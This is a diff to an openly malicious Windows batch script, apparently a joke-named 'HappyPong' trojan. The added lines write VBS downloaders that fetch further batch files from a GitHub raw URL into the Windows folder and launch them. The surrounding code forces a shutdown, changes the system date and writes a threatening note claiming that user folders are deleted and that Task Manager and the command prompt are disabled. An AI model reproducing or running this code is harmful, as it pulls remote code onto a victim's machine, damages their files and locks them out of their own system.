@@ -59,7 +59,7 @@ echo wscript.sleep 600000 >> shutdown.vbs
 echo WshShell.Run "explorer.bat" >> shutdown.vbs
 echo wscript.sleep 5000 >> shutdown.vbs
 echo WshShell.Run "regret.vbs" >> shutdown.vbs
-echo wscript.sleep 10000 >> shutdown.vbs
+echo wscript.sleep 15000 >> shutdown.vbs
 echo WshShell.Run "shutdown -s -t 0" >> shutdown.vbs
 goto ChangeUrRealName
 
@@ -128,11 +128,47 @@ echo   .open >> download5.vbs
 echo   .write xHttp.responseBody >> download5.vbs
 echo   .savetofile "C:\WINDOWS\HappyPong\rename.bat", 2 '//overwrite >> download5.vbs
 echo end with >> download5.vbs
+echo on error resume next >> download6.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download6.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download6.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/RENAMEFILEEXTENSIONS/main/rename2.bat", False >> download6.vbs
+echo xHttp.Send >> download6.vbs
+echo with bStrm >> download6.vbs
+echo   .type = 1 '//binary >> download6.vbs
+echo   .open >> download6.vbs
+echo   .write xHttp.responseBody >> download6.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\rename2.bat", 2 '//overwrite >> download6.vbs
+echo end with >> download6.vbs
+echo on error resume next >> download7.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download7.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download7.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/RENAMEFILEEXTENSIONS/main/rename3.bat", False >> download7.vbs
+echo xHttp.Send >> download7.vbs
+echo with bStrm >> download7.vbs
+echo   .type = 1 '//binary >> download7.vbs
+echo   .open >> download7.vbs
+echo   .write xHttp.responseBody >> download7.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\rename3.bat", 2 '//overwrite >> download7.vbs
+echo end with >> download7.vbs
+echo on error resume next >> download8.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download8.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download8.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/RENAMEFILEEXTENSIONS/main/rename4.bat", False >> download8.vbs
+echo xHttp.Send >> download8.vbs
+echo with bStrm >> download8.vbs
+echo   .type = 1 '//binary >> download8.vbs
+echo   .open >> download8.vbs
+echo   .write xHttp.responseBody >> download8.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\rename4.bat", 2 '//overwrite >> download8.vbs
+echo end with >> download8.vbs
 start download1.vbs
 start download2.vbs
 start download3.vbs
 start download4.vbs
 start download5.vbs
+start download6.vbs
+start download7.vbs
+start download8.vbs
 goto RemoveUrUglyWallpaper
 
 :RemoveUrUglyWallpaper
@@ -288,7 +324,7 @@ echo superuser.com >> note.txt
 echo instructables.com (content.instructables.com) >> note.txt
 echo hitech-us.com >> note.txt
 echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus) >> note.txt
-echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, special thanks to ManlyBadassHero) >> note.txt
+echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, Akmal, special thanks to ManlyBadassHero) >> note.txt
 echo msfn.org >> note.txt
 echo y2mate.com >> note.txt
 echo wikihow.com >> note.txt
@@ -335,7 +371,7 @@ echo YOU HAVE 10 MINUTES TO PREP BEFORE YOUR EX ENDS YOU AND YOUR COMPUTER EXPLO
 echo CHECK YOUR %username% FOLDER, SOME FOLDERS INSIDE THAT FOLDER ARE DELETED! >> note.txt 
 echo DO NOT TRY TO UNINFECT YOUR COMPUTER WITH TASK MANAGER AND COMMAND PROMPT, IT IS DISABLED! >> note.txt
 echo IT'S OKAY IF YOU DO NOT WANT TO PLAY THE GAME! >> note.txt 
-echo IF YOU CLOSE THE WEBPAGE, IT DOESN'T MEAN THAT YOU REMOVED THE VIRUS, IT MEANS YOU HAVE TO CLICK THE VBS FILE! IF THE VBS FILE DOESN'T WORK (50% chance), YOU MADE A BIG PROBLEM, YOU LOST THE GAME! >> note.txt
+echo IF YOU CLOSE THE WEBPAGE, IT DOESN'T MEAN THAT YOU REMOVED THE VIRUS, IT MEANS YOU HAVE TO CLICK THE VBS FILE! IF THE VBS FILE DOESN'T WORK (95% chance), YOU MADE A BIG PROBLEM, YOU LOST THE GAME! >> note.txt
 echo IT'S TOO LATE! SO DO NOT DO THAT! >> note.txt
 echo UNDERSTOOD? GOOD! >> note.txt
 echo CONTACT US: 606 606 6006 or happy@happypong.com (666 HAPPY STREET, HOUSTON, TEXAS, USA) >> note.txt
@@ -474,8 +510,11 @@ goto GoBackToThePast
 cd C:\WINDOWS\HappyPong
 date 6/6/2006
 start change.vbs
-start explorer.exe
 start rename.bat
+start rename2.bat
+start rename3.bat
+start rename4.bat
+start explorer.exe
 start ieandstuff.vbs
 start pong.vbs
 start shutdown.vbs
